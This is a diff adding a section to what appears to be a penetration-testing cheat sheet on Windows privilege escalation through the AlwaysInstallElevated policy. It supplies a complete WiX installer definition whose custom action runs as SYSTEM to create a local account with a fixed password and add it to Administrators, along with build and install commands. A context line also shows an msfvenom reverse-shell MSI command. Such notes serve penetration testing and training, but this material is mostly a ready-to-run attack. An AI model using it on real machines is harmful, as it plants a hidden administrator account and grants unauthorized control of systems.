@@ -320,6 +320,126 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>-f msi -o shell.msi
 ```
+
+### Command to MSI
+
+To create a MSI from linux we can use `wixl` from `msitools`.
+
+```bash
+sudo apt update
+sudo apt install -y msitools uuid-runtime
+```
+
+We need to create two files:
+
+* `payload.txt`
+
+```
+AllwaysInstallElevated privilege escalation MSI
+```
+
+* `benjugat-privesc.wxs`
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+
+  <Product
+      Id="{660D2F7A-106A-4DFE-A20B-D03E180F49F4}"
+      Name="Benjugat PrivEsc"
+      Language="1033"
+      Version="1.0.0"
+      Manufacturer="Benjugat"
+      UpgradeCode="{BCE9FF8B-5FA6-4F9A-935F-0A604EC2A028}">
+
+    <Package
+        InstallerVersion="200"
+        Compressed="yes"
+        InstallScope="perMachine" />
+
+    <Media
+        Id="1"
+        Cabinet="benjugat-privesc.cab"
+        EmbedCab="yes" />
+
+    <Property
+        Id="CMDPATH"
+        Value="C:\Windows\System32\cmd.exe" />
+
+    <Directory Id="TARGETDIR" Name="SourceDir">
+
+      <Directory Id="ProgramFiles64Folder">
+
+        <Directory
+            Id="INSTALLDIR"
+            Name="BenjugatPrivEsc">
+
+          <Component
+              Id="MainComponent"
+              Guid="{C673AAAE-3327-4824-8835-C5969F06A940}"
+              Win64="yes">
+
+            <File
+                Id="PayloadFile"
+                Name="payload.txt"
+                Source="payload.txt"
+                KeyPath="yes" />
+
+          </Component>
+
+        </Directory>
+
+      </Directory>
+
+    </Directory>
+
+    <Feature
+        Id="MainFeature"
+        Title="Benjugat PrivEsc"
+        Level="1">
+
+      <ComponentRef Id="MainComponent" />
+
+    </Feature>
+
+    <CustomAction
+        Id="AddAdmin"
+        Property="CMDPATH"
+        ExeCommand='/c "net user benjugat Benjugat123! /add &amp; net localgroup Administrators benjugat /add &gt; C:\Windows\Temp\out.txt 2&gt;&amp;1"'
+        Execute="deferred"
+        Impersonate="no"
+        Return="check" />
+
+    <InstallExecuteSequence>
+
+      <Custom
+          Action="AddAdmin"
+          Sequence="6500">
+        NOT Installed
+      </Custom>
+
+    </InstallExecuteSequence>
+
+  </Product>
+
+</Wix>
+```
+
+To compile the `msi`
+
+```
+wixl -v -a x64 -o benjugat-privesc.msi benjugat-privesc.wxs
+```
+
+To check the custom actions we can use:
+
+```
+msiinfo export benjugat-privesc.msi CustomAction
+```
+
+Finally install it with doble click or with `msiexec`.
+
 ### EXE to MSI
 
 To create a custom MSI we first need to install a extension to our Visual Studio.
